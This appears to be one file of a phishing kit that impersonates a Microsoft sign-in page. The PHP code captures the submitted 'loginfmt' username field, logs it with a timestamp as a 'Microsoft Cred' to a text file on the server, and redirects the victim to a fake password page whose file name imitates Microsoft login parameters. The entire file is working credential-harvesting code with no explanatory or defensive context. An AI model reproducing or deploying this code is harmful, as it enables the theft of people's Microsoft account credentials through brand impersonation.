<?php

file_put_contents("/var/www/html/microsoft/usernames.txt", date("m/d/Y") . " " . date("h:i:s") . " Microsoft Cred: " . $_POST['loginfmt'] . "\n", FILE_APPEND);

header('Location: ./password_client_id=2391290a-10889f-19e9109b-01c909a292ff09d-1919b901e-58518c_content_token=11PT9vGyEj9ZKSdGBH3nhb_2-Jy_cLKhIb-OJoppDyqkq9QkqxBHEycDQ4xs5deoiTEZ3rU7J_redirect_uri=https3a22www0fofficeaacom20accounts0fv20flogin0f638318506088344824.html');

exit();

?>
